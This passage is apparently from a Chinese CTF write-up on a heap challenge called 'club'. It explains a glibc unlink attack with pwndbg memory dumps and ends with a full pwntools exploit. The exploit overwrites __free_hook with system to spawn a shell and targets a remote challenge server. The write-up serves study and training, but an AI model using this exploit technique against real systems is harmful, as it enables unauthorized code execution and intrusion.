    0x555555757470: 0x0000000000000000  0x0000000000000000
    0x555555757480: 0x0000000000000000  0x0000000000000000
    0x555555757490: 0x0000000000000000  0x0000000000000000
    0x5555557574a0: 0x0000000000000000  0x0000000000000000
    0x5555557574b0: 0x0000000000000000  0x0000000000000000
    0x5555557574c0: 0x0000000000000000  0x0000000000000000
    0x5555557574d0: 0x0000000000000000  0x0000000000000000
    0x5555557574e0: 0x0000000000000000  0x00000000000000c1
    0x5555557574f0: 0x00007ffff7dd1b78  0x00000000000000b1     构造成一个新的堆，长度为0xb1
    0x555555757500: 0x0000555555756100  0x0000555555756108     构造fd和bk
    0x555555757510: 0x0000000000000000  0x0000000000000000
    0x555555757520: 0x0000000000000000  0x0000000000000000
    0x555555757530: 0x0000000000000000  0x0000000000000000
    0x555555757540: 0x0000000000000000  0x0000000000000000
    0x555555757550: 0x0000000000000000  0x0000000000000000
    0x555555757560: 0x0000000000000000  0x0000000000000000
    0x555555757570: 0x0000000000000000  0x0000000000000000
    0x555555757580: 0x0000000000000000  0x0000000000000000
    0x555555757590: 0x0000000000000000  0x0000000000000000
    0x5555557575a0: 0x00000000000000b0  0x00000000000000d0      修改prev_size为0xb0
    0x5555557575b0: 0x0000000000000000  0x0000000000000000
    0x5555557575c0: 0x0000000000000000  0x0000000000000000
    0x5555557575d0: 0x0000000000000000  0x0000000000000000
    0x5555557575e0: 0x0000000000000000  0x0000000000000000
    0x5555557575f0: 0x0000000000000000  0x0000000000000000
    0x555555757600: 0x0000000000000000  0x0000000000000000
构造了一个fd和bk指向存储box 地址的.bss段，这样就能构成一个双链表，bypass unlink的check:
    P->fd->bk == P
    P->bk->fd == P
不过这个时候如果free box2，会报错退出，报错的内容是 `free(): corrupted unsorted chunks`
去源码中搜一下该error的check:
    4248  bck = unsorted_chunks(av);
    4249  fwd = bck->fd;
    4250  if (__glibc_unlikely (fwd->bk != bck))
    4251      malloc_printerr ("free(): corrupted unsorted chunks")
bck指向unsortbin，所以fwd指向box3，然而box3的bk已经被构造成了新chunk的size位，所以报错退出了
这个时候只需要在free box2之前，malloc一个box5，这样将会把unsortbin中的box3分类到smallbin中，从而bypass
unsortbin check
#### 利用
在free box2之后，内存大致如下:
    pwndbg> x/6gx 0x202100+0x555555554000
    0x555555756100: 0x0000000000000000 0x0000555555757420
    0x555555756110: 0x0000555555757440 0x0000555555756100
    0x555555756120: 0x00005555557575b0 0x0000555555757680
box3的地址已经指向该bss段，从而我们已经可以做到任意地址写了
我的利用思路是，把box 2修改为free_hook的地址，然后把box 0修改为`/bin/sh\0`正好8byte，这样box
3就是一个`/bin/sh`字符串了
我们只需要在free_hook中写上system的地址，调用free(box
3)，则相当于调用system("/bin/sh\0")，从而达到getshell
完整payload如下:
    from pwn import *
    from ctypes import cdll
    DEBUG = 1
    if DEBUG:
        context.log_level = "debug"
        r = process("./club")
        e = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    else:
        r = remote("123.206.22.95", 8888)
        e = ELF("./libc.so.6")
    malloc_hook = e.symbols['__malloc_hook']
    free_hook = e.symbols['__free_hook']
    system_address = e.symbols['system']
    top_chunk = malloc_hook + 0x68
    seed_address = 0x202148
    addr_list = 0x202100
    one_gadget = 0xf0274
    puts_got = 0x202028
    def create_box(n, l):
        r.readuntil(">")
        r.sendline("1")
        r.readuntil(">")
        r.sendline(str(n))
        r.readuntil(">")
        r.sendline(str(l))
    def free_box(n):
        r.readuntil(">")
        r.sendline("2")
        r.readuntil(">")
        r.sendline(str(n))
    def leave_message(n, msg):
        r.readuntil(">")
        r.sendline("3")
        r.readuntil(">")
        r.sendline(str(n))
        r.sendline(msg)
    def show_message(n):
        r.readuntil(">")
        r.sendline("4")
        r.readuntil(">")
        r.sendline(str(n))
    def guess_num(n):
        r.readuntil(">")
        r.sendline("5")
        r.readuntil(">")
        r.sendline(str(n))
    def get_rand_num():
        guess_num(123)
        r.readuntil("is ")
        random_num = int(r.readuntil("!")[:-1])
        return random_num
    def guest(random_num):
        seed_base = 0x202148
        libc = cdll.LoadLibrary("libc.so.6")
        for x in xrange(0x10000000, 0xfffff000, 0x1000):
            libc.srand(x+seed_base)
            if libc.rand() == random_num:
                next_randnum = libc.rand()
                break
        return next_randnum
    def get_elf_base(random_num):
        guess_num(random_num)
        r.readuntil("secret:")
        elf_base = int(r.readuntil("!")[:-1])
        return elf_base-seed_address
    def get_libc_base():
        free_box(3)
        show_message(3)
        data = r.readuntil("You")[:-3].strip()
        top = u64(data+"\x00\x00")
        return top - top_chunk
    def main():
        random_num = get_rand_num()
        next_randnum = guest(random_num)
        elf_base = get_elf_base(next_randnum)
        print "get ELF base address: 0x%x"%elf_base
        create_box(1, 24)
        create_box(2, 168)
        create_box(3, 184)
        create_box(4, 200)
        libc_base = get_libc_base()
        create_box(5, 300)
        print "get libc base address: 0x%x"%libc_base
        set_list2_size = p64(0xc1)*3 + "\xc1"
        leave_message(1, set_list2_size)
        set_list3 = p64(0) + p64(0xb1) + p64(elf_base+addr_list) + p64(elf_base+addr_list+8)
        set_list3 += "a"*0x90+p64(0xb0)
        leave_message(3, set_list3)
        free_box(2)
        write_address_list = "/bin/sh\x00" + "a"*8 + p64(libc_base+free_hook)
        leave_message(3, write_address_list)
        leave_message(2, p64(libc_base+system_address))
        free_box(3)
        # leave_message(3, "aaaaaaaa")
        # show_message(3)
        r.interactive()
    if __name__ == '__main__':
        main()
#### 总结
unlink原理很早我就知道了，但是却是第一次实践，理论和实际还是差很大的，所以我踩了挺多的坑，花了挺多的时间
我还考虑过fastbin的double free的利用，但是失败了......
* * *